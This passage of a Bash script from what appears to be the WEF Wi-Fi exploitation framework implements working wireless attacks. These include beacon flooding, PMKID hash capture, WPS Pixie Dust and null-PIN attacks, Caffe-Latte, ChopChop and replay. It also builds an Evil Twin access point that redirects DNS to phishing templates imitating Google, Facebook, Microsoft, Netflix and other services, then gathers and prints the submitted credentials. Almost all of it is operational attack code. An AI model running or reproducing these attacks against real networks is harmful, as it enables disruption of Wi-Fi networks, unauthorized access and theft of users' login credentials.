  default="300s"; ask_time

  if [ ! "${attack_time}" ]; then
    attack_time="300"
  fi

  color_output_ln "WEF" "Type of attack:"
  color_output_ln "1" "With a custom wordlist of AP names"
  color_output "2" "With random AP names"
  echo
  color_output_no_line "WEF" "Choose an option > " && read beacon_option

  check_and_create "/opt/wef/main/captures/${name}/"; sleep 0.1
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  color_output_ln "*" "Starting Beacon Flood attack..."; sleep 0.3

  iwconfig ${netCard} channel ${channel}; sleep 0.2 # Change channel to target one

  if [ "$beacon_option" == "2" ] && [ "$verbose" == "0" ]; then
    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null"
  elif [ "$beacon_option" == "2" ] && [ "$verbose" == "1" ]; then
    echo
    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200"
  elif [ "$beacon_option" == "1" ] && [ "$verbose" == "0" ]; then
    echo -ne "\n${blueC}[${endC}${yC}WEF${endC}${blueC}] File with the AP names:${endC} " && read names_file
    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 -f \"${names_file}\" &>/dev/null"
  elif [ "$beacon_option" == "1" ] && [ "$verbose" == "1" ]; then
    echo
    color_output_no_line "WEF" "File with the AP names: " && read names_file
    echo
    timeout ${attack_time} bash -c "mdk4 ${netCard} b -c ${channel} -s 200 -f \"${names_file}\""
  fi; sleep 0.3

  good_output_ln "+" "Beacon Flood attack completed"; sleep 0.1
  report-gen
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
  reset_info

  keep_exit
}

# PMKID Attack
function pmkid_attack(){
  clear; banner1; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2

  default="180"; ask_time

  if [ ! "${attack_time}" ]; then
    attack_time="180"
  fi

  # Parse wifi info
  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  pmkid_bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1 | tr -d ":")
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  progress_bar 2 0.2 "*" "Starting PMKID attack"
  check_and_create "/opt/wef/main/captures/${name}"

  #if [ "${verbose}" == "0" ]; then
  echo
    #timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} -o pmkid_capture --enable_status=1 | grep -i 'PMKIDR' &>/dev/null"
  #elif [ "${verbose}" == "1" ]; then
  timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} -o pmkid_capture --enable_status=1"
  #fi

  progress_bar 2 0.3 "*" "Obtaining hashes"

  rm "/opt/wef/main/captures/${name}/pmkid_capture" 2>/dev/null
  cp "${dir}/pmkid_capture" "/opt/wef/main/captures/${name}/" 2>/dev/null

  hcxpcapngtool -o pmkid_hash "${dir}/pmkid_capture" &>/dev/null; sleep 0.1
  cat pmkid_hash 2>/dev/null | grep -i "${pmkid_bssid}" | sponge pmkid_hash

  rm "${dir}/pmkid_capture" 2>/dev/null
  mv "${dir}/pmkid_hash" "/opt/wef/main/captures/${name}/" 2>/dev/null

  good_output_ln "+" "PMKID Attack completed"
  sleep 0.3; report-gen

  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.1
  color_output_ln "*" "Hashes stored in: /opt/wef/main/captures/${name}/"; sleep 0.1
  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
    pmkid_crack
  else
    reset_info; keep_exit
  fi
}

# Passive Attack Function
function passive_attack(){
  clear; banner2; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2; default="5m"; ask_time

  if [ ! "${attack_time}" ]; then
    attack_time="5m"
  fi

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  progress_bar 2 0.2 "*" "Starting Passive/Stealthy attack"
  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null & # Escape double quotes so they are executed by xterm and avoid errors
  passive2_PID=$!

  sleep "${attack_time}"

  kill -9 ${passive2_PID}; wait ${passive2_PID} 2>/dev/null # Kill background process

  good_output_ln "+" "Passive attack completed"; sleep 0.1
  check_and_create "/opt/wef/main/captures/${name}"
  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null
  report-gen

  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
  color_output_ln "*" "Captures stored in: /opt/wef/main/captures/${name}/"; sleep 0.5
  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option

  if [ "${crack_option}" == "y" ] || [ "${crack_option}" == "yes" ]; then
    handshake_crack
  else
    reset_info; keep_exit
  fi
}

# Michael Exploitation Attack
function michael(){
  clear; banner3; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2; default="120s"; ask_time

  if [ ! "${attack_time}" ]; then
    attack_time="120"
  fi

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  check_and_create "/opt/wef/main/captures/${name}"

  progress_bar 2 0.2 "*" "Starting Michael Exploitation attack"

  if [ "$verbose" == "0" ]; then
    timeout "${attack_time}" bash -c "mdk4 ${netCard} m -t ${ap_mac} -j &>/dev/null"
  elif [ "$verbose" == "1" ]; then
    echo
    timeout "${attack_time}" bash -c "mdk4 ${netCard} m -t ${ap_mac} -j"
  fi

  report-gen
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
  reset_info
  good_output_ln "+" "Attack completed"; sleep 0.5; reset_info
  
  keep_exit
}

# WPS Pixie Dust Attack
function pixie_dust(){
  clear; banner1; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2; sleep 0.3

  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
  progress_bar 2 0.2 "*" "Starting Pixie Dust attack"

  if [ "$verbose" == "0" ]; then
    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -v -g 3
  elif [ "$verbose" == "1" ]; then
    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -vv -g 3
  fi; sleep 0.3

  check_and_create "/opt/wef/main/captures/${name}/"
  report-gen
  good_output_ln "+" "Pixie Dust Attack completed"; sleep 0.1
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
  reset_info
	
  keep_exit
}

# Null Pin Attack
function null-pin(){
  clear; banner3; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  progress_bar 2 0.2 "*" "Starting Null Pin attack..."
  echo

  timeout 60 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -f -N -g 2 -vv -p ''"; sleep 0.2
	
  check_and_create "/opt/wef/main/captures/${name}"

  good_output_ln "+" "Null Pin Attack completed"; sleep 0.1
  report-gen
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
  reset_info
  
  keep_exit
}

# Caffe-Latte Attack
function caffe-latte(){
  clear; banner1; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2; default="180s"; ask_time

  if [ ! "${attack_time}" ]; then
    attack_time="180"
  fi

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  progress_bar 2 0.2 "*" "Starting Caffe-Latte attack"
  xterm -hold -e "airodump-ng -c ${channel} -w CaffeLatte ${netCard}" 2>/dev/null &
  air_PID=$!

  timeout ${attack_time} bash -c "airbase-ng -c ${channel} --essid \"${name}\" ${netCard} -L -x 100"
  sleep 0.2
  kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null

  check_and_create "/opt/wef/main/captures/${name}"
  mv CaffeLatte "/opt/wef/main/captures/${name}" 2>/dev/null
  report-gen

  good_output_ln "+" "Caffe-Latte Attack completed"; sleep 0.1
  color_output_ln "*" "Captures stored in: /opt/wef/main/captures/${name}/"; sleep 0.1
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
  reset_info
	
  keep_exit
}

# Chopchop Attack
function chopchop(){
  clear; banner3; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  sleep 0.1; echo; ask_data2; sleep 0.2

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  color_output_ln "*" "Starting Chopchop attack...\n"
  
  aireplay-ng -1 0 -e "${name}" -a ${client_mac} -h ${ap_mac} ${netCard}
  sleep 0.3; echo
  aireplay-ng -4 -h ${client_mac} -b ${ap_mac} ${netCard}
  sleep 0.3

  check_and_create "/opt/wef/main/captures/${name}"
  report-gen
  mv Capture* "/opt/wef/main/captures/${name}/" 2>/dev/null

  color_output_ln "+" "Attack completed"; sleep 0.1
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
  reset_info

  keep_exit
}

# Replay Attack
function replay(){
  clear; banner1; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; sleep 0.1; ask_data2; default="180s"; ask_time; sleep 0.2
	
  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  if [ ! "${attack_time}" ]; then
    attack_time="180"
  fi

  color_output_ln "*" "Speed of the attack:"; sleep 0.1
  color_output "1" "Fast"; sleep 0.1
  color_output "2" "Normal\n"; sleep 0.1
  color_output_no_line "WEF" "Select an option [default: normal]: " && read speed_option

  if [ "$speed_option" == "1" ]; then
    sleep 0.1
    color_output_ln "*" "Increasing the amount of IV's..."
    timeout 120 bash -c "aireplay-ng -1 0 -e ${name} -a ${ap_mac} ${netCard} &>/dev/null"
  fi; sleep 0.1

  color_output_ln "*" "Starting replay attack..."; sleep 1

  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null
  air2_PID=$!
  sleep 0.3

  timeout ${attack_time} bash -c "aireplay-ng -3 -b ${ap_mac} ${netCard} 2>/dev/null"

  sleep 1; kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null

  check_and_create "/opt/wef/main/captures/${name}"
  report-gen
  mv Capture* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.3

  good_output_ln "+" "Attack completed"; sleep 1
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
  reset_info

  keep_exit
}

# Command Execution Mode
function exec_commands(){
  color_output_ln "*" "Entering command mode\n"; sleep 0.3
  #tput cnorm
  while true; do
    echo -ne "${yC}#${blueC} $(whoami) >${endC} " && read your_command

    command_to_check=$(echo -e "${your_command}" | awk '{print $1}' FS=" ")
    if [ "${your_command}" != "exit" ]; then
      which ${command_to_check} &>/dev/null
      if [ "$(echo $?)" == "0" ] || [ "${command_to_check}" == "cd" ]; then
        echo
        ${your_command}
        echo
      else
        echo -e "Unknown command"
      fi
    else
      # tput civis
      sleep 0.3
      color_output_ln "*" "Entering normal mode"; sleep 0.5
      break
    fi
  done
}

# Evil Twin Attack
function evilTwin(){
  clear; banner4 ; sleep 0.4; trap evil_c INT

  echo
  color_output_ln "*" "Configuring adapter for the Evil Twin attack..."
  back="0"

  airmon-ng stop ${netCard} &>/dev/null; sleep 1.4
  ifconfig ${evilCard} down; sleep 1.4
  iwconfig ${evilCard} mode monitor; sleep 1.2

  good_output_ln "+" "Adapter configured successfully\n"
  fuser -k 53/tcp &>/dev/null; fuser -k 80/tcp &>/dev/null; sleep 0.3

  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
  if [ "${kill_network_services}" == "true" ]; then
    airmon-ng check kill &>/dev/null
  fi
  killall hostapd dnsmasq dhcpd 2>/dev/null

  color_output_no_line "*" "Name of your evil AP: " && read evil_name
  sleep 0.2; echo
  color_output_no_line "*" "Channel of your AP: " && read def_channel
	
  if [ "${def_channel}" -lt "15" ]; then 
    hw_mode=g # 2.4Ghz
  else
    hw_mode=a # 5Ghz
  fi

  sleep 0.2; echo
  color_output_no_line "*" "Password for your AP (leave blank for a public network): " && read AP_passw
  sleep 0.2

  echo
  color_output_no_line "*" "Interface to route internet through (default=eth0): " && read interface_to_route
  if [ ! "${interface_to_route}" ]; then
    interface_to_route="eth0"
  fi

  progress_bar 2 0.2 "+" "Creating malicious AP"
  ifconfig $evilCard up; sleep 0.3

  # Creating hostapd configuration file
  rm /opt/wef/cache/hostapd.conf >/dev/null 2>&1
  echo "
interface=${evilCard}
ssid=${evil_name}
hw_mode=${hw_mode}
channel=${def_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211" >> /opt/wef/cache/hostapd.conf

  if [ "${AP_passw}" != "" ]; then
    echo "
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
wpa_passphrase=${AP_passw}" >> /opt/wef/cache/hostapd.conf
  fi

  hostapd /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &

  sleep 1
  # Creating dnsmasq configuration file
  rm /opt/wef/cache/dnsmasq.conf >/dev/null 2>&1
  echo "
interface=${evilCard}
dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
dhcp-option=3,10.0.221.1
dhcp-option=6,10.0.221.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.221.1
address=/#/10.0.221.1" >> /opt/wef/cache/dnsmasq.conf

  ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0
  sleep 0.5
  route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1

  dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &

  iptables -t nat -A POSTROUTING -o ${interface_to_route} -j MASQUERADE
  iptables -A FORWARD -i ${interface_to_route} -o ${evilCard} -m state --state RELATED,ESTABLISHED -j ACCEPT 
  iptables -A FORWARD -i ${evilCard} -o ${interface_to_route} -j ACCEPT

  echo 1 > /proc/sys/net/ipv4/ip_forward

  templates=$(ls /opt/wef/main/templates | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' 2>/dev/null)
  color_output_ln "WEF" "Templates: ${templates}"; sleep 0.1
  echo -e "${blueC}You can use a custom template by adding the content to /opt/wef/main/templates/template-name/${endC}\n"; sleep 0.1
  color_output_no_line "WEF" "Template to use (default: google): " && read template_name
  upper_name=$(echo "${template_name}" | sed 's/.*/\u&/')

  if [ ! "$template_name" ]; then
    template_name="google"
  fi

  sleep 0.3; pushd "/opt/wef/main/templates/${template_name}" > /dev/null 2>&1

  php -S 10.0.221.1:80 > /dev/null 2>&1 &

  sleep 0.1; popd > /dev/null 2>&1
  good_output_ln "+" "Evil Twin attack deployed successfully"; sleep 4
  total_devices="0"; clear

  while true; do
    if [ "$back" == "1" ]; then # Add this check at the beggining of the loop to speed next iteration checks
      break
    fi

    good_output "+" "Press Ctrl + C to cancel the attack"

    if [ "${template_name}" == "starbucks" ] || [ "${template_name}" == "google" ] || [ "${template_name}" == "facebook" ] || [ "${template_name}" == "twitter" ] || [ "${template_name}" == "yahoo" ] || [ "${template_name}" == "optimum" ]; then
      creds_content=$(cat "/opt/wef/main/templates/${template_name}/datos-privados.txt" 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
    elif [ "${template_name}" == "spotify" ] || [ "${template_name}" == "netflix" ] || [ "${template_name}" == "microsoft" ] || [ "${template_name}" == "linkedin" ] || [ "${template_name}" == "dropbox" ] || [ "${template_name}" == "instagram" ]; then
      creds_content=$(cat "/opt/wef/main/templates/${template_name}/usernames.txt" 2>/dev/null)
    else
      creds_content=$(cat "/opt/wef/main/templates/${template_name}/credentials.txt" 2>/dev/null)
    fi

    color_output_ln "WEF" "Connected devices: ${endC}${yC}${total_devices}"
    if [ "${creds_content}" ]; then
      echo -e "\n${yC}${upper_name}"
      echo -e "--------"
      echo -e "${blueC}${creds_content}${endC}"
    else
      echo -e "\n${blueC}Credentials not submitted yet${endC}"
    fi

    rm ip-log.tmp 2>/dev/null
    for number in $(seq 2 254); do
      timeout 1 bash -c "ping -c 1 10.0.221.${number}" &>/dev/null && echo -e "10.0.221.${number}" >> ip-log.tmp &
    done; sleep 4

    if [ -f "ip-log.tmp" ]; then
      total_devices=$(wc -l ip-log.tmp | awk '{print $1}' 2>/dev/null)
    fi

    if [ "$back" != "1" ]; then # This check helps to cancel the attack almost in every moment
      sleep 11; clear
    fi

  done
}

# Panel function
function showPanel(){
  echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
  echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
  echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
  echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
  echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
  echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
  echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
  echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
  echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
}

# GPS Spoofing function
function gps_spoof(){
  echo -ne "\n${blueC}[${yC}*${blueC}] Starting GPS Spoofing"; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne ".${endC}"; sleep 0.2
  /opt/wef/extra/gps-sdr-sim/gps-sdr-sim
  echo -e "\n${blueC}[${greenC}+${blueC}] Attack completed${endC}"
}

# Help inside the framework
function listHelp(){
  echo -e "\n\t${yC}Command\t\t\tDescription"
  echo -e "\t-------\t\t\t-----------${endC}"
  echo -e "${blueC} \tscan\t\t\t- Scan access points during 25s (also refresh AP list)${endC}"
  echo -e "${blueC} \tlist\t\t\t- List already scanned APs"
  echo -e "${blueC} \texit/quit\t\t- Exit from the framework${endC}"
  echo -e "${blueC} \tchipsets\t\t- List the chipsets which supports monitor mode${endC}"
  #echo -e "${blueC} \tmodules\t\t\t- Show the availables modules${endC}"
  #echo -e "${blueC} \tload <module_name>\t- Load a different module${endC}"
  echo -e "${blueC} \thelp/?\t\t\t- Print this help panel${endC}"
  echo -e "${blueC} \tinhibit <ap_name>\t- Inhibit an AP connections until you press Ctrl + C${endC}"
  echo -e "${blueC} \textra\t\t\t- Print a list of extra commands and utilities${endC}"
  echo -e "${blueC} \tinfo\t\t\t- Show info about your network adapter${endC}"
  echo -e "${blueC} \tverbose\t\t\t- Set verbose on, to see more output${endC}"
  echo -e "${blueC} \tno verbose\t\t- Set verbose off, to see less output${endC}"
  echo -e "${blueC} \tdump\t\t\t- Dump credentials submitted in the EvilTwin attack${endC}"
  echo -e "${blueC} \tenable/disable auto\t- Enable/disable the automatic deletion of the EvilTwin creds every week${endC}"
  echo -e "${blueC} \tattacks\t\t\t- Show info about the different attacks${endC}"
  echo -e "${blueC} \tupdate\t\t\t- Check if an update is available and ask you to install it"
  echo -e "${blueC} \tversion\t\t\t- Print the info about the version of wef${endC}"
  echo -e "${blueC} \texec\t\t\t- Allow you to execute commands without exiting the program${endC}"
  echo -e "${blueC} \tpanel\t\t\t- Display attack options panel${endC}"
  echo -e "${blueC} \tclear/cls\t\t- Clear the screen${endC}"
}

# AP Scan
function ap_scan(){
  echo; timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
  sleep 0.2
  good_output_ln "+" "Scan completed"
}

function list_aps(){
  if [ -f "scan_output" ]; then
    echo; cat scan_output; sleep 0.2
  else
    color_output_ln "*" "There is no AP scan!"
  fi
}

# Dump credentials from EvilTwin Attack
function dumpCreds(){
  face=$(cat /opt/wef/main/templates/facebook/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  yahoo=$(cat /opt/wef/main/templates/yahoo/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  google=$(cat /opt/wef/main/templates/google/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  star=$(cat /opt/wef/main/templates/starbucks/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  optimum=$(cat /opt/wef/main/templates/optimum/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  insta=$(cat /opt/wef/main/templates/instagram/usernames.txt 2>/dev/null)
  twitter=$(cat /opt/wef/main/templates/twitter/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
  link=$(cat /opt/wef/main/templates/linkedin/usernames.txt 2>/dev/null)
  spotify=$(cat /opt/wef/main/templates/spotify/usernames.txt 2>/dev/null)
  netflix=$(cat /opt/wef/main/templates/netflix/usernames.txt 2>/dev/null)
  microsoft=$(cat /opt/wef/main/templates/microsoft/usernames.txt 2>/dev/null)

  creds_counter="0"

  if [ "${google}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Google"
    echo -e "------"
    echo -e "${blueC}${google}${endC}"
  fi

  if [ "${face}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Facebook"
    echo -e "--------"
    echo -e "${blueC}${facebook}${endC}"
  fi

  if [ "${star}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Starbucks"
    echo -e "---------"
    echo -e "${blueC}${star}${endC}"
  fi

  if [ "${yahoo}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Yahoo"
    echo -e "-----"
    echo -e "${blueC}${yahoo}${endC}"
  fi

  if [ "${optimum}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Optimum"
    echo -e "-------"
    echo -e "${blueC}${optimum}${endC}"
  fi

  if [ "${twitter}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Twitter"
    echo -e "-------"
    echo -e "${blueC}${twitter}${endC}"
  fi

  if [ "${insta}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Instagram"
    echo -e "---------\n"
    echo -e "${blueC}${insta}${endC}"
  fi

  if [ "${spotify}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Spotify"
    echo -e "-------\n"
    echo -e "${blueC}${spotify}${endC}"
  fi

  if [ "${link}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Linkedin"
    echo -e "--------\n"
    echo -e "${blueC}${link}${endC}"
  fi

  if [ "${microsoft}" ]; then
    creds_counter="1"
    echo -e "\n${yC}Microsoft"
    echo -e "$---------\n"
    echo -e "${blueC}${microsoft}${endC}"
  fi

  if [ "${creds_counter}" == "0" ]; then
    color_output_ln "X" "No credentials submitted"
  fi
}

words=("help" "randomize mac" "attacks" "deauth" "beacon" "deauthentication" "caffe-latte" "authentication" "auth" "pmkid" "pmkid attack" "start card" "pmkid-attack" "beacon-flood" "beaconflood" "michael" "start" "up" "exit" "quit" "salir" "sortir" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "evil" "evil-twin" "eviltwin" "chopchop" "replay" "replay attack" "beacon flood" "deauth attack" "deauth-attack" "deauthentication-attack" "evil-twin-attack" "authentication attack" "deauthentication attack" "randomize" "mac" "passive" "passive attack" "stealthy" "stealthy attack" "stealthy-attack" "passive-attack" "randomize-mac" "info" "pixie dust" "pixie" "pixie-dust" "replay-attack" "exec" "command" "execute" "exi" "qui" "chopchop attack" "chopchop-attack" "michael attack" "michael-attack" "wef" "WEF" "modules" "load bluetooth" "load wifi" "clear" "panel" "scan" "chipsets" "adapters" "info" "evil twin" "?" "inhibit" "inhibitor" "cls" "verbose" "noverbose" "Deauthentication" "Authentication" "PMKID" "Beacon" "Beacon Flood" "Michael" "Michael Exploitation" "Passive" "Stealthy" "Start" "Pixie" "Pixie Dust" "PixieDust" "Caffe-Latte" "Caffe Latte" "CaffeLatte" "ChopChop" "Evil" "Evil Twin" "EvilTwin" "Evil-Twin" "Null" "Null Pin" "Replay" "Replay Attack" "Randomize" "version" "null" "enable auto" "enable" "disable auto" "disable" "extra" "update" "gps" "b" "d" "a" "e" "r" "n" "m" "banner")

parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")

# Main Wifi Function
if [ "$(id -u)" == "0" ]; then

  program_version="1.1"
  while getopts ":i:" arg; do
    case ${arg} in
      i) netCard=$OPTARG;
    esac
  done

  for parameter in ${parameters[@]}; do
    if [ "${parameter}" == "--version" ]; then
      echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
      echo -e "Created by D3Ext <d3ext@proton.me>\n"
      exit 0
    fi

    if [ "$parameter" == "-h" ] || [ "$parameter" == "--help" ]; then
      helpPanel
      exit 0
    fi

    if [ "$parameter" == "--headless" ]; then
      headless="1"
    fi

    if [ "$parameter" == "-v" ] || [ "$parameter" == "--verbose" ]; then
      verbose="1"
    fi
  done

  if [ ! "$headless" ]; then
    headless="0"
  fi

  if [ ! "$verbose" ]; then
    verbose="0"
  fi

  if [ ! -d "/opt/wef/main/" ]; then
    echo -e "${yC} __      _____ ___ "
    echo -e " \ \    / / __| __|"
    echo -e "  \ \/\/ /| _|| _| "
    echo -e "   \_/\_/ |___|_|  ${endC}"
    color_output_ln "WEF" "Please run the setup.sh before using WEF\n"
    exit 0
  fi

  if [ "$1" == "--interface" ]; then
    netCard="$2"
  elif [ "$2" == "--interface" ]; then
    netCard="$3"
  elif [ "$3" == "--interface" ]; then
    netCard="$4"
  fi

  if [ "$netCard" ]; then
    if [ ! -d "/sys/class/net/${netCard}" ]; then
      echo -e "${yC} __      _____ ___ "
      echo -e " \ \    / / __| __|"
      echo -e "  \ \/\/ /| _|| _| "
      echo -e "   \_/\_/ |___|_|  ${endC}"
      color_output_ln "X" "Interface not found\n"
      exit 0
    fi

    mon_check=$(check_interface_mode)
    if [ "${mon_check}" == "monitor" ]; then
      echo -e "${yC} __      _____ ___ "
      echo -e " \ \    / / __| __|"
      echo -e "  \ \/\/ /| _|| _| "
      echo -e "   \_/\_/ |___|_|  ${endC}"
      color_output_ln "X" "Interface should be in managed mode\n"
      exit 0
    fi

    progress_bar 2 1 "*" "Starting framework"

    ifconfig ${netCard} up &>/dev/null

    time_counter="0"
    while true; do
      trap ctrl_c INT; module="wifi"

      if [ "$time_counter" == "0" ]; then
        clear; correct_counter="0"

        #tput civis
        all_banners; sleep 0.09
        export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
        dir=$(pwd)
        dependencies; sleep 0.09
        active_card; sleep 0.09
        card_status; sleep 0.09
        mac_status; sleep 0.09
        echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
        sleep 0.09
        echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
